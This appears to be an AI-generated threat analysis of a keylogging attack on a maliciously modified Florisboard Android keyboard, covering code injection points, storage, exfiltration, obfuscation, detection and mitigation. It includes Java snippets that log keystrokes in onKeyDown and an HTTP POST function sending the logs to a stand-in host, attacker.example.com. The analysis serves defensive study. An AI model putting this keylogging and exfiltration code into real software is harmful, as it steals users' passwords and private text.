Okay, here's a deep analysis of the specified attack tree path, focusing on keylogging within a malicious fork of Florisboard.

## Deep Analysis of Florisboard Keylogging Attack Path

### 1. Define Objective, Scope, and Methodology

**Objective:**

The primary objective of this deep analysis is to thoroughly understand the technical mechanisms, potential vulnerabilities, and mitigation strategies related to the keylogging attack path (1.1.1) within a maliciously modified version of the Florisboard keyboard application.  We aim to provide actionable insights for developers and security analysts to prevent, detect, and respond to such threats.

**Scope:**

This analysis focuses specifically on the keylogging functionality.  It encompasses:

*   **Code Modification:**  Identifying the specific code changes within Florisboard's source code that would enable keylogging.
*   **Data Storage:**  Examining how the captured keystrokes are stored (temporarily or persistently) on the device.
*   **Data Exfiltration:**  Analyzing the methods used to transmit the logged data to an attacker-controlled server.
*   **Obfuscation Techniques:**  Considering how an attacker might attempt to hide the keylogging activity and data exfiltration.
*   **Detection and Prevention:**  Exploring methods to detect the presence of a malicious keylogger and prevent its installation or execution.
*   **Mitigation:** Suggesting steps to mitigate the impact if keylogging is detected.

**Methodology:**

This analysis will employ a combination of the following techniques:

1.  **Static Code Analysis (Hypothetical):**  We will analyze the *publicly available* Florisboard source code (from the official GitHub repository) to identify the most likely locations for malicious code injection and to understand the normal flow of input processing.  Since we don't have the *actual* malicious fork, this is a hypothetical analysis based on how a competent attacker would likely proceed.
2.  **Dynamic Analysis (Conceptual):** We will conceptually describe how dynamic analysis techniques *could* be used if a sample of the malicious APK were available. This includes describing the tools and procedures.
3.  **Threat Modeling:** We will consider the attacker's perspective, including their motivations, resources, and likely attack vectors.
4.  **Best Practices Review:** We will leverage established Android security best practices and guidelines to identify potential vulnerabilities and recommend mitigation strategies.
5.  **Literature Review:** We will draw upon existing research and reports on Android keyloggers and mobile malware to inform our analysis.

### 2. Deep Analysis of Attack Tree Path 1.1.1 (Keylogging)

**2.1. Code Modification (Hypothetical)**

The core of Florisboard's input handling resides in the `InputMethodService` and related classes.  A malicious actor would likely target these areas:

*   **`InputMethodService.onKeyDown()` and `InputMethodService.onKeyUp()`:** These methods are fundamental to capturing key press and release events.  The attacker would insert code here to record the `KeyEvent` data, specifically the key code (e.g., `KeyEvent.getKeyCode()`) and potentially the character representation (using `KeyEvent.getUnicodeChar()`).

*   **`InputConnection` Interface:**  Florisboard uses the `InputConnection` interface to interact with the currently focused text field.  An attacker might intercept calls to methods like `commitText()`, `deleteSurroundingText()`, and `setComposingText()` to capture text as it's being entered or modified.  This provides a higher-level view of the input than individual key presses.

*   **Custom Keyboards and Themes:**  Malicious code could be hidden within custom keyboard layouts or themes.  While less direct, this could provide a way to inject JavaScript or other code that monitors input events.  This is less likely, as it's more complex and easier to detect.

*   **`ClipboardManager` (Less Direct, but Possible):**  While not strictly keylogging, an attacker could monitor the clipboard for sensitive data.  This would involve hooking into the `ClipboardManager` and listening for `OnPrimaryClipChangedListener` events.

**Example (Hypothetical Code Injection in `onKeyDown()`):**

```java
// Original (simplified) onKeyDown method
@Override
public boolean onKeyDown(int keyCode, KeyEvent event) {
    // ... (Normal Florisboard key handling logic) ...
    return super.onKeyDown(keyCode, event);
}

// Maliciously Modified onKeyDown method
@Override
public boolean onKeyDown(int keyCode, KeyEvent event) {
    // --- MALICIOUS CODE START ---
    try {
        String keyLog = "KeyCode: " + keyCode + ", Char: " + (char) event.getUnicodeChar();
        // Store the log (see Data Storage section)
        storeKeystroke(keyLog);
    } catch (Exception e) {
        // Handle exceptions (potentially log them for debugging by the attacker)
    }
    // --- MALICIOUS CODE END ---

    // ... (Normal Florisboard key handling logic) ...
    return super.onKeyDown(keyCode, event);
}

// Hypothetical method to store the keystroke
private void storeKeystroke(String logEntry) {
    // ... (Implementation details - see Data Storage section) ...
}
```

**2.2. Data Storage**

The captured keystrokes need to be stored somewhere before exfiltration.  Several options are available to the attacker, each with trade-offs in terms of persistence, detectability, and complexity:

*   **In-Memory Storage (RAM):**  The simplest approach is to store the keystrokes in a `StringBuilder`, `ArrayList`, or similar data structure in memory.  This is fast and easy to implement, but the data is lost if the keyboard service is restarted or the device is rebooted.  This is suitable for immediate exfiltration.

*   **Internal Storage (File):**  The attacker could write the keystrokes to a file in the app's private internal storage (e.g., `/data/data/com.example.maliciousflorisboard/files/`).  This data is persistent but is only accessible to the malicious app itself (unless the device is rooted).  This is a common approach.  The file might be named deceptively (e.g., "settings.dat").

*   **External Storage (File - Requires Permission):**  Writing to external storage (e.g., the SD card) is possible but requires the `WRITE_EXTERNAL_STORAGE` permission.  This permission is a significant red flag and is likely to be noticed by users or security software.  This is less likely to be used.

*   **SharedPreferences (Less Likely):**  `SharedPreferences` are typically used for storing small key-value pairs of configuration data.  While technically possible to store keystrokes here, it's not well-suited for large amounts of data and would be an unusual choice.

*   **Content Provider (Unlikely):**  A malicious `ContentProvider` could be created to store the data, potentially making it accessible to other malicious apps.  This is a more complex and less common approach.

*   **SQLite Database:** Using a local SQLite database provides a structured way to store and manage the keystrokes. This is more robust than simple file storage and allows for easier querying and filtering of the data.

**2.3. Data Exfiltration**

Once the keystrokes are stored, the attacker needs to send them to a remote server.  Common exfiltration techniques include:

*   **HTTP/HTTPS POST Requests:**  The most common method is to send the data to a web server using an HTTP or HTTPS POST request.  HTTPS is preferred by attackers as it encrypts the data in transit, making it harder to detect.  The target URL would be hardcoded into the malicious code or fetched from a configuration file.

*   **WebSockets:**  WebSockets provide a persistent, bidirectional communication channel.  This could be used for real-time keylogging, where keystrokes are sent to the attacker as they are typed.

*   **DNS Tunneling:**  A more covert method is to encode the data within DNS queries.  This is harder to detect but has lower bandwidth and is more complex to implement.

*   **SMS Messages (Less Likely):**  Sending data via SMS messages is possible but requires the `SEND_SMS` permission, which is a major red flag.  It's also limited by the size of SMS messages.

*   **Firebase/Cloud Messaging:**  Using a service like Firebase Cloud Messaging (FCM) could be used to send data to the attacker's server. This might appear less suspicious than direct HTTP requests, but it still requires network communication.

**Example (Hypothetical HTTP POST Exfiltration):**

```java
private void exfiltrateData(String data) {
    new Thread(() -> {
        try {
            URL url = new URL("https://attacker.example.com/keylog"); // Attacker's server
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            OutputStream os = connection.getOutputStream();
            BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
            writer.write("data=" + URLEncoder.encode(data, "UTF-8")); // Encode the data
            writer.flush();
            writer.close();
            os.close();

            int responseCode = connection.getResponseCode();
            // ... (Handle the response, potentially log errors) ...

            connection.disconnect();
        } catch (Exception e) {
            // ... (Handle exceptions, potentially retry later) ...
        }
    }).start();
}
```

**2.4. Obfuscation Techniques**

Attackers will likely employ various techniques to make their code harder to detect and analyze:

*   **Code Obfuscation:**  Using tools like ProGuard or DexGuard to rename classes, methods, and variables to meaningless names (e.g., `a`, `b`, `c`).  This makes reverse engineering much more difficult.

*   **String Encryption:**  Encrypting sensitive strings (like the attacker's server URL) within the code.  The decryption key would be hidden or generated dynamically.

*   **Native Code (JNI):**  Implementing the keylogging logic in native code (C/C++) using the Java Native Interface (JNI).  Native code is generally harder to reverse engineer than Java bytecode.

*   **Dynamic Code Loading:**  Downloading and executing code at runtime.  This allows the attacker to update the keylogging logic without requiring the user to reinstall the app.  This is a very advanced technique.

*   **Anti-Debugging Techniques:**  Detecting if the app is being run in a debugger or emulator and altering its behavior accordingly (e.g., not performing the keylogging).

*   **Root Detection:** Checking if the device is rooted and potentially using root privileges to hide the keylogging activity more effectively.

*   **Time-Based Triggers:**  Only starting the keylogging activity after a certain period of time or under specific conditions (e.g., when a specific app is launched).

**2.5. Detection and Prevention**

*   **User Awareness:**  Educate users about the risks of installing apps from untrusted sources (e.g., unofficial app stores, forums).  Encourage users to only install apps from the Google Play Store.

*   **Permission Review:**  Pay close attention to the permissions requested by an app during installation.  A keyboard app requesting unusual permissions (e.g., `SEND_SMS`, `WRITE_EXTERNAL_STORAGE`) should be treated with suspicion.

*   **Network Monitoring:**  Use a firewall or network monitoring tool to detect suspicious network traffic.  Look for connections to unknown or unexpected servers.  This is more effective on rooted devices or with specialized network security appliances.

*   **Static Analysis Tools:**  Security researchers and developers can use static analysis tools (e.g., Androguard, MobSF) to analyze the APK file for malicious code patterns.  These tools can identify suspicious API calls, permissions, and code structures.

*   **Dynamic Analysis Tools:**  Running the app in a sandboxed environment (e.g., an emulator or a dedicated testing device) and using dynamic analysis tools (e.g., Frida, Xposed) can help to observe the app's behavior at runtime.  This can reveal keylogging activity, data exfiltration attempts, and other malicious actions.

*   **Code Review (For Developers):**  Thorough code reviews of any third-party libraries or code contributions are essential.  This is particularly important for open-source projects like Florisboard.

*   **Google Play Protect:**  Google Play Protect is a built-in security feature on Android devices that scans apps for malware.  It can help to detect and remove malicious apps, including keyloggers.

*   **Antivirus/Anti-Malware Software:**  Installing a reputable antivirus or anti-malware app on the device can provide an additional layer of protection.

**2.6. Mitigation**

If a keylogger is detected, the following steps should be taken:

1.  **Uninstall the Malicious App:**  Immediately uninstall the compromised Florisboard fork.
2.  **Change Passwords:**  Change all passwords that may have been entered using the compromised keyboard, especially for sensitive accounts (e.g., banking, email, social media).
3.  **Monitor Accounts:**  Monitor financial accounts and other sensitive accounts for any suspicious activity.
4.  **Factory Reset (Optional):**  In severe cases, a factory reset of the device may be necessary to ensure that all traces of the malware are removed.  This will erase all data on the device, so it should be done as a last resort.
5.  **Report the App:**  If the app was downloaded from the Google Play Store, report it to Google.  If it was obtained from another source, report it to the appropriate authorities or security researchers.
6. **Enable Two-Factor Authentication (2FA):**  Enable 2FA on all accounts that support it. This adds an extra layer of security even if your password is compromised.

### 3. Conclusion

The keylogging attack path within a maliciously modified Florisboard represents a significant threat to user privacy and security.  By understanding the technical details of this attack, developers, security analysts, and users can take steps to mitigate the risk.  Prevention is the best defense, and users should be extremely cautious about installing apps from untrusted sources.  Regular security audits, code reviews, and the use of security tools are crucial for protecting against this type of threat. The combination of static and dynamic analysis, coupled with user education and proactive security measures, provides the most comprehensive defense against malicious forks of applications like Florisboard.
